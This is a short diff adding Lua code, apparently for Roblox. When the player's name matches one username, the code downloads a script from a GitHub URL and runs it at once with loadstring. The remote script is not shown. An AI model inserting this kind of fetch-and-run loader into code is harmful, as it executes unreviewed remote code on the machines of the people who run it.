@@ -1,0 +1,4 @@
+local key = game.Players.LocalPlayer.Name
+if key == "soleezZ" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/souls00001/wrfwgsdg/main/soulsscripts"))()
+end
